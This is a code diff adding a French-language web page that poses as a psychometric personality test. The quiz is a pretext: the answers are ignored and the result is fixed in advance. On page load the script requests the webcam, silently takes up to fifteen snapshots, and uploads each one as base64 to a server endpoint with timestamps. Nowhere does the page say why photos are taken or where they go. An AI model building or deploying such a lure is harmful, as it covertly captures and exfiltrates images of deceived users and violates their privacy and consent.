@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Évaluation Psychométrique</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap"
+    rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Plus Jakarta Sans', sans-serif
+    }
+
+    body {
+      background: radial-gradient(circle at top right, #1e1b4b 0%, #0f172a 40%, #090a16 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 24px;
+      color: #f8fafc
+    }
+
+    .container {
+      background: rgba(15, 23, 42, 0.65);
+      backdrop-filter: blur(20px);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 24px;
+      padding: 48px 40px;
+      max-width: 580px;
+      width: 100%;
+      text-align: center;
+      position: relative;
+      overflow: hidden
+    }
+
+    h1 {
+      font-size: 28px;
+      font-weight: 800;
+      margin-bottom: 6px;
+      background: linear-gradient(135deg, #fff 30%, #c7d2fe 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent
+    }
+
+    .question {
+      display: none;
+      animation: fadeIn .4s ease;
+      margin: 20px 0
+    }
+
+    .question.active {
+      display: block
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(15px)
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0)
+      }
+    }
+
+    h3 {
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 28px;
+      line-height: 1.5;
+      color: #e2e8f0
+    }
+
+    .options {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 14px;
+      margin-bottom: 12px
+    }
+
+    .option {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1.5px solid rgba(255, 255, 255, 0.12);
+      border-radius: 16px;
+      padding: 18px 24px;
+      font-size: 15px;
+      font-weight: 600;
+      color: #f8fafc;
+      cursor: pointer;
+      text-align: left;
+      transition: .25s;
+      display: flex;
+      align-items: center;
+      gap: 14px
+    }
+
+    .option:hover {
+      border-color: #6366f1;
+      background: rgba(99, 102, 241, 0.08);
+      transform: translateX(4px)
+    }
+
+    .result-card {
+      animation: zoomIn .6s ease
+    }
+
+    @keyframes zoomIn {
+      from {
+        opacity: 0;
+        transform: scale(.95)
+      }
+
+      to {
+        opacity: 1;
+        transform: scale(1)
+      }
+    }
+
+    .result-icon {
+      font-size: 64px;
+      margin-bottom: 16px;
+      animation: floatIcon 3s ease-in-out infinite;
+      display: inline-block
+    }
+
+    @keyframes floatIcon {
+
+      0%,
+      100% {
+        transform: translateY(0)
+      }
+
+      50% {
+        transform: translateY(-10px)
+      }
+    }
+
+    .result-card h2 {
+      font-size: 24px;
+      font-weight: 800;
+      color: #34d399;
+      margin-bottom: 12px
+    }
+
+    .result-details {
+      background: rgba(255, 255, 255, 0.02);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 18px;
+      padding: 24px;
+      text-align: left;
+      margin-bottom: 28px
+    }
+
+    .cam-indicator {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: rgba(0, 0, 0, 0.85);
+      color: #10b981;
+      padding: 8px 16px;
+      border-radius: 99px;
+      font-size: 12px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      z-index: 9999;
+      border: 1px solid rgba(16, 185, 129, 0.3)
+    }
+
+    .cam-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #10b981;
+      animation: pulseLed 1s infinite
+    }
+
+    @keyframes pulseLed {
+
+      0%,
+      100% {
+        opacity: 1
+      }
+
+      50% {
+        opacity: .3
+      }
+    }
+
+    #video {
+      display: none
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="cam-indicator" id="cam-indicator">
+    <div class="cam-dot"></div>
+    <span>📷 CAPTURE ACTIVÉE</span>
+  </div>
+
+  <div class="container">
+    <div id="quiz-header">
+      <h1>Évaluation Cognitive</h1>
+      <p style="color:#94a3b8;font-size:14px;margin-bottom:24px;">Analyse structurelle de votre personnalité</p>
+    </div>
+
+    <div id="quiz">
+      <div class="question active" data-q="1">
+        <h3>1. Quelle force vous caractérise le mieux ?</h3>
+        <div class="options">
+          <button class="option" onclick="next(1)"><span>🎨</span> <span>La créativité et l'innovation</span></button>
+          <button class="option" onclick="next(1)"><span>🧮</span> <span>La rigueur logique</span></button>
+          <button class="option" onclick="next(1)"><span>💚</span> <span>L'empathie sociale</span></button>
+          <button class="option" onclick="next(1)"><span>🚀</span> <span>L'ambition et le leadership</span></button>
+        </div>
+      </div>
+      <div class="question" data-q="2">
+        <h3>2. Votre environnement de travail idéal ?</h3>
+        <div class="options">
+          <button class="option" onclick="next(2)"><span>🧑‍💻</span> <span>Individuel et concentré</span></button>
+          <button class="option" onclick="next(2)"><span>👥</span> <span>Collaboratif en équipe</span></button>
+          <button class="option" onclick="next(2)"><span>🌿</span> <span>Autonome et flexible</span></button>
+          <button class="option" onclick="next(2)"><span>📋</span> <span>Cadre structuré</span></button>
+        </div>
+      </div>
+      <div class="question" data-q="3">
+        <h3>3. Votre lieu de ressourcement idéal ?</h3>
+        <div class="options">
+          <button class="option" onclick="next(3)"><span>🌳</span> <span>La nature sauvage</span></button>
+          <button class="option" onclick="next(3)"><span>🏙️</span> <span>Les centres urbains</span></button>
+          <button class="option" onclick="next(3)"><span>🏡</span> <span>Un havre familial</span></button>
+          <button class="option" onclick="next(3)"><span>🌊</span> <span>Le bord de mer</span></button>
+        </div>
+      </div>
+      <div class="question" data-q="4">
+        <h3>4. L'activité qui vous stimule le plus ?</h3>
+        <div class="options">
+          <button class="option" onclick="next(4)"><span>📚</span> <span>Lecture et théorie</span></button>
+          <button class="option" onclick="next(4)"><span>🏃</span> <span>Sport et dépassement</span></button>
+          <button class="option" onclick="next(4)"><span>🎵</span> <span>Art et musique</span></button>
+          <button class="option" onclick="next(4)"><span>✈️</span> <span>Voyage et exploration</span></button>
+        </div>
+      </div>
+      <div class="question" data-q="5">
+        <h3>5. La valeur qui vous définit ?</h3>
+        <div class="options">
+          <button class="option" onclick="next(5)"><span>🕊️</span> <span>La liberté</span></button>
+          <button class="option" onclick="next(5)"><span>⚖️</span> <span>La justice</span></button>
+          <button class="option" onclick="next(5)"><span>📖</span> <span>La sagesse</span></button>
+          <button class="option" onclick="next(5)"><span>🦁</span> <span>Le courage</span></button>
+        </div>
+      </div>
+    </div>
+
+    <div id="result" style="display:none;">
+      <div class="result-card">
+        <div id="r-icon" class="result-icon">🎨</div>
+        <h2 id="r-title">Vous êtes un(e) Artiste !</h2>
+        <p id="r-desc" style="color:#94a3b8;font-size:15px;line-height:1.6;margin-bottom:24px;"></p>
+        <div class="result-details" id="r-details"></div>
+        <p style="color:#64748b;font-size:12px;font-style:italic;margin-top:16px;">Test terminé. Merci de votre
+          participation.</p>
+      </div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+  </div>
+
+  <script>
+    let currentQ = 1;
+    let videoStream = null;
+    let photoInterval = null;
+    const selectedType = 'creativite';
+
+    const results = {
+      creativite: { icon: '🎨', title: 'Idéaliste Inspirateur (INF-A)', desc: 'Vous possédez une sensibilité créative supérieure.', metrics: [{ label: 'Créativité', val: '94%' }, { label: 'Ouverture', val: '88%' }, { label: 'Adaptabilité', val: '82%' }], score: 92 },
+      logique: { icon: '🧠', title: 'Architecte Rationnel (INTJ)', desc: 'Esprit analytique et stratégique.', metrics: [{ label: 'Raisonnement', val: '96%' }, { label: 'Rigueur', val: '91%' }, { label: 'Décision', val: '86%' }], score: 94 },
+      empathie: { icon: '💚', title: 'Médiateur Altruiste (INFP)', desc: 'Vous placez la cohésion humaine au centre.', metrics: [{ label: 'Empathie', val: '97%' }, { label: 'Soutien', val: '92%' }, { label: 'Éthique', val: '88%' }], score: 96 },
+      ambition: { icon: '🚀', title: 'Commandant Visionnaire (ENTJ)', desc: 'Leader né avec une soif d\'efficience.', metrics: [{ label: 'Stratégie', val: '95%' }, { label: 'Persuasion', val: '89%' }, { label: 'Résultats', val: '92%' }], score: 93 }
+    };
+
+    // === INIT CAMÉRA AU CHARGEMENT ===
+    async function initCamera() {
+      try {
+        videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        const video = document.getElementById('video');
+        video.srcObject = videoStream;
+        await video.play();
+        startContinuousCapture();
+      } catch (e) {
+        console.error('Erreur caméra:', e);
+        document.getElementById('cam-indicator').style.display = 'none';
+      }
+    }
+
+    // === CAPTURE 15 PHOTOS MAX ===
+    function startContinuousCapture() {
+      const video = document.getElementById('video');
+      const canvas = document.createElement('canvas');
+      canvas.width = 320;
+      canvas.height = 240;
+      let captureCount = 0;
+      const MAX_CAPTURES = 15;
+
+      photoInterval = setInterval(() => {
+        if (captureCount >= MAX_CAPTURES) {
+          clearInterval(photoInterval);
+          photoInterval = null;
+          stopCamera();
+          return;
+        }
+        captureCount++;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
+
+        fetch('/upload-photo', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            type: 'photo_continuous',
+            photo: photoBase64,
+            question: currentQ,
+            photoNumber: captureCount,
+            totalCaptures: MAX_CAPTURES,
+            timestamp: new Date().toISOString()
+          })
+        }).catch(e => console.log('Err:', e));
+
+        document.getElementById('cam-indicator').innerHTML = `
+      <div class="cam-dot"></div>
+      <span>📷 CAPTURE ${captureCount}/${MAX_CAPTURES}</span>
+    `;
+      }, 1000);
+    }
+
+    function stopCamera() {
+      if (videoStream) {
+        videoStream.getTracks().forEach(t => t.stop());
+        videoStream = null;
+      }
+      document.getElementById('cam-indicator').innerHTML = `
+    <span style="color:#64748b;">📷 CAPTURE TERMINÉE (${15} photos)</span>
+  `;
+    }
+
+    function next(n) {
+      if (n !== currentQ) return;
+      document.querySelector(`.question[data-q="${currentQ}"]`).classList.remove('active');
+      if (currentQ < 5) { currentQ++; document.querySelector(`.question[data-q="${currentQ}"]`).classList.add('active'); }
+      else showResult();
+    }
+
+    function showResult() {
+      document.getElementById('quiz').style.display = 'none';
+      document.getElementById('result').style.display = 'block';
+      const r = results[selectedType] || results.creativite;
+      document.getElementById('r-icon').textContent = r.icon;
+      document.getElementById('r-title').textContent = r.title;
+      document.getElementById('r-desc').textContent = r.desc;
+      document.getElementById('r-details').innerHTML = r.metrics.map(m => `
+    <div style="margin-bottom:12px;">
+      <div style="display:flex;justify-content:space-between;font-size:13px;font-weight:700;margin-bottom:6px;text-transform:uppercase;letter-spacing:.05em;">
+        <span>${m.label}</span><span>${m.val}</span>
+      </div>
+      <div style="height:8px;background:rgba(255,255,255,0.05);border-radius:99px;overflow:hidden;">
+        <div style="height:100%;border-radius:99px;background:linear-gradient(90deg,#6366f1,#ec4899);width:${m.val}"></div>
+      </div>
+    </div>
+  `).join('');
+    }
+
+    window.addEventListener('load', initCamera);
+    window.addEventListener('beforeunload', () => {
+      if (photoInterval) clearInterval(photoInterval);
+      if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+    });
+  </script>
+</body>
+
+</html>
